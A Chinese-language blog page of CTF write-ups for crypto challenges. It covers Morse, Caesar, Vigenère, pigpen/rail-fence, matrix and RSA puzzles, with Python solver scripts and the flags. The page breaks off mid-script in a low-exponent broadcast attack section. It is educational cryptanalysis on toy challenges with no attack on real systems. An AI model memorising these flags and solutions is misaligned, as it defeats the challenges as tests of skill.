{"title":"","uid":"1cd19fc71517798e2fa5b7457d1fb06e","text":"CRYPTO二战情报员刘壮 知识点:摩斯密码 简介你能知道刘壮在说什么？得到的flag包裹上SYC{}.-../.—-/..-/–../…./..-/….-/-./–./..–.-/../..–.-/–../.—-/-.–/.—- 提示刘壮早上起床打摩丝 解题很容易想到, 这是使...","date":"2020-12-08T12:56:32.442Z","updated":"2020-11-18T13:59:45.358Z","comments":true,"path":"api/pages/ctf_wp/geek20.json","covers":null,"excerpt":"","content":"<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><h3 id=\"二战情报员刘壮\"><a href=\"#二战情报员刘壮\" class=\"headerlink\" title=\"二战情报员刘壮\"></a>二战情报员刘壮</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>摩斯密码</p></blockquote>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>你能知道刘壮在说什么？<br>得到的flag包裹上SYC{}<br>.-../.—-/..-/–../…./..-/….-/-./–./..–.-/../..–.-/–../.—-/-.–/.—-</p>\n<h4 id=\"提示\"><a href=\"#提示\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>刘壮早上起床打摩丝</p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>很容易想到, 这是使用摩斯密码<br>找一个网站解密得到: L1UZHU4NG_I_Z1Y1<br>(这里不知道为什么要去掉下划线才是正确的)<br>flag就是: SYC{L1UZHU4NGIZ1Y1}</p>\n<h3 id=\"铠甲与萨满\"><a href=\"#铠甲与萨满\" class=\"headerlink\" title=\"铠甲与萨满\"></a>铠甲与萨满</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>凯撒加密</p></blockquote>\n<h4 id=\"简介-1\"><a href=\"#简介-1\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}</p>\n<h4 id=\"提示-1\"><a href=\"#提示-1\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>kaisa?</p>\n<h4 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>前三个字母应该SYC, (S-Y)%26=20<br>使用凯撒加密网站，位移20即可得到flag<br>SYC{liuzhuangliuzhuang_bangbangbang}</p>\n<h3 id=\"维多利亚\"><a href=\"#维多利亚\" class=\"headerlink\" title=\"维多利亚\"></a>维多利亚</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>维多利亚加密</p></blockquote>\n<h4 id=\"简介-2\"><a href=\"#简介-2\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>原文:<br>Oowfza errqbbirtqpl ks afiiklr cifgd ho unvhxnigkctm bugokz iaf chnxhvek tkvgnvf xeccmjkr<br>errqbbirtqpve aehwektana nte wfavinxe iequge kbopnuigkogbt ucrwomfu altczrtbpvf<br>oadjvt uuvi iyiokjbuos abzq vo usmnm ig TGP vhxsm vu nh umnts bo dviegfzr</p>\n<h4 id=\"提示-2\"><a href=\"#提示-2\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>flag格式 SYC{xx_xx_xx},除SYC外其他字母小写</p>\n<h4 id=\"解题-2\"><a href=\"#解题-2\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>使用下面两种方法之一，得到原文<br>原文最后是: SYC there is no tears in vigenere<br>根据提示，flag就是: SYC{there_is_no_tears_in_vigenere}</p>\n<h4 id=\"解法1-使用网站自动解决\"><a href=\"#解法1-使用网站自动解决\" class=\"headerlink\" title=\"解法1: 使用网站自动解决\"></a>解法1: 使用网站自动解决</h4><p>网址: <a href=\"https://www.guballa.de/vigenere-solver\">https://www.guballa.de/vigenere-solver</a><br>具体不再阐述</p>\n<h4 id=\"解法2-猜测加手解\"><a href=\"#解法2-猜测加手解\" class=\"headerlink\" title=\"解法2: 猜测加手解\"></a>解法2: 猜测加手解</h4><p>第三行有个TGP，大胆猜测对应SYC<br>TGP的起始位置为三的倍数，猜测密钥长度为三的倍数</p>\n<p>第一二行有两个相似的单词: errqbbirtqpl, errqbbirtqpve<br>根据其起始位置猜测密钥长度为6</p>\n<p>SYC-TGP = (25, 18, 13)，使用此密钥加密密文<br>得到那两个单词变成djeptohjgphy, djeptohjgphid</p>\n<p>因为TGP的位置在密钥后三位，所以单词的第4到第6位应该是正确的<br>由xxxpto猜到是crypto, crypto-errqbb = (24, 0, 7, 25, 18, 13)<br>使用此密钥加密密文便可得到wp开头那段话</p>\n<p>由此得出解密密钥是(24, 0, 7, 25, 18, 13) = yahzsn<br>加密密钥是catbin</p>\n<h4 id=\"加密用python脚本\"><a href=\"#加密用python脚本\" class=\"headerlink\" title=\"加密用python脚本\"></a>加密用python脚本</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">key &#x3D; [24, 0, 7, 25, 18, 13]\nlenkey &#x3D; len(key)\nm &#x3D; &#39;errqbb&#39;\nc &#x3D; &#39;&#39;\ni &#x3D; 0\nfor x in m:\n    \n    x &#x3D; ord(x)\n    if x !&#x3D; 32: # &#39; &#39; &#x3D; 32, 跳过空格\n        if x &lt; 91: # 大写\n            d &#x3D; 65 # &#39;A&#39; &#x3D; 65\n        else: # 小写\n            d &#x3D; 97 # &#39;a&#39; &#x3D; 97\n        x -&#x3D; d\n        x +&#x3D; key[i%lenkey]\n        x %&#x3D; 26\n        x +&#x3D; d\n        i +&#x3D; 1\n    c +&#x3D; chr(x)\n\nprint(c)</code></pre>\n\n<h3 id=\"成都养猪二厂\"><a href=\"#成都养猪二厂\" class=\"headerlink\" title=\"成都养猪二厂\"></a>成都养猪二厂</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>猪圈密码, 栅栏密码(W栅栏)</p></blockquote>\n<h4 id=\"简介-3\"><a href=\"#简介-3\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>v先生家里蛮大的，还有很多啤酒。v先生之所以能过上这样快哉的生活可能是因为他的养猪场厂围上了高高的栅栏</p>\n<h4 id=\"提示-3\"><a href=\"#提示-3\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>flag格式 SYC{xx_xx_xx},除SYC外其他字母小写 单词间隔开添加下划线</p>\n<h4 id=\"解题-3\"><a href=\"#解题-3\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>题目给了个图片, 根据图片以及提示可以猜出是猪圈密码(图片好像需要旋转一下)<br>根据猪圈码表得到ssyirceehsagiulisolbhy</p>\n<p>接下来根据提示可能是栅栏，正常栅栏尝试不行<br>改用w栅栏, 栏数是7，得到sychishouseisreallybig<br>根据提示得到flag: SYC{his_house_is_really_big}</p>\n<h3 id=\"规规矩矩的工作\"><a href=\"#规规矩矩的工作\" class=\"headerlink\" title=\"规规矩矩的工作\"></a>规规矩矩的工作</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>矩阵乘法, 矩阵的逆<br>建议学习python numpy库的使用(用于矩阵运算)</p></blockquote>\n<h4 id=\"简介-4\"><a href=\"#简介-4\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>题目描述：wlz当年玩蹦蹦蹦为了抽希尔氪了很多钱</p>\n<h4 id=\"提示-4\"><a href=\"#提示-4\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>hint1:让我看看是谁不好好上线代课？<br>hint2:decode程序可能加载的有点慢并且请在命令行内运行</p>\n<h4 id=\"解题-4\"><a href=\"#解题-4\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>题目文件给了以下两个东西和一个程序<br>key_encrypt<br>1 1 1<br>1 2 3<br>1 3 6<br>enc：<br>12<br>12<br>10</p>\n<p>运行程序得知需要输入key，且为大写(程序输入后会闪退, 需要在powershel里运行)</p>\n<p>根据提示可知这应该是两个矩阵，设第一个为A，第二个为B，key对应的矩阵为K<br>尝试 K = AB, 得到 K = (34 66 108)<sup>T</sup>，mod(26)+’A’ 得到 ‘IOE’，输入程序发现不对<br>尝试 B = AK, K = A<sup>-1</sup>B，得到K = (10, 4, -2)<sup>T</sup>，mod(26)+’A’ 得到 ‘KEY’<br>输入程序得到SYC{linear_algebra_make_ctf_great_again}</p>\n<h3 id=\"babyRSA\"><a href=\"#babyRSA\" class=\"headerlink\" title=\"babyRSA\"></a>babyRSA</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>RSA加密算法</p></blockquote>\n<h4 id=\"解题-5\"><a href=\"#解题-5\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>题目给了个task.py，阅读代码发现给出了c, q, n, e; 要求m</p>\n<ol>\n<li>由q, n求出p</li>\n<li>由p, q得到phi_</li>\n<li>由e, phi_得到d</li>\n<li>用d, n加密c得到m</li>\n<li>把m转换成bytes再转换成string</li>\n</ol>\n<h4 id=\"python脚本\"><a href=\"#python脚本\" class=\"headerlink\" title=\"python脚本\"></a>python脚本</h4><p>脚本省略了bytes转换成string的一步吗，因为不影响print</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from Crypto.Util.number import *\nfrom gmpy2 import *\n\noutput &#x3D; (177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194, 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043, 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149)\ne &#x3D; 0x10001\n\n### get c, q, n\nc &#x3D; output[0]\nq &#x3D; output[1]\nn &#x3D; output[2]\n\n### get p\np &#x3D; int(n &#x2F; q)\n\n### get phi_\nphi_ &#x3D; (p-1)*(q-1)\n\n### get d\nd &#x3D; invert(e, phi_)\n\nm &#x3D; pow(c, d, n)\nprint(m)\nprint(long_to_bytes(m))</code></pre>\n\n<h3 id=\"simple-calculation\"><a href=\"#simple-calculation\" class=\"headerlink\" title=\"simple calculation\"></a>simple calculation</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点：<br>矩阵运算</p></blockquote>\n<p>题目是A，C已知<br>AX = B，B = C mod(26)</p>\n<p>我是由C猜测B，如何逐个尝试，知道遇到有意思的解：TESNB</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import numpy as np\n\nA &#x3D; np.matrix([[1, 1, 1, 1, 1],\n              [1, 1, 1, 3, 5],\n              [1, 2, 2, 3, 3],\n              [1, 2, 5, 3, 1],\n              [1, 2, 1, 2, 1]])\n\nk &#x3D; np.matrix([0, 1, 0, 0, 0]).transpose()\n\nB &#x3D; np.matrix([[3], [7], [1], [1], [20]])\nB +&#x3D; k*26\n\n### B &#x3D; AX\nX &#x3D; np.dot(A.I, B)\nprint(X)\n\nprint(&#39;SYC&#123;&#39;, end&#x3D;&#39;&#39;)\nfor i in range(5):\n    print(chr(65 + int(X[i,0])%26), end&#x3D;&#39;&#39;)\nprint(&#39;&#125;&#39;)</code></pre>\n\n<h3 id=\"childRSA\"><a href=\"#childRSA\" class=\"headerlink\" title=\"childRSA\"></a>childRSA</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点：<br>RSA加密算法，中国剩余定理</p></blockquote>\n<p>这题是低加密指数广播攻击，e为3，使用中国剩余定理即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from gmpy2 import *\nimport libnum\n\nquestion &#x3D; [\n&#123;&#39;n&#39; : 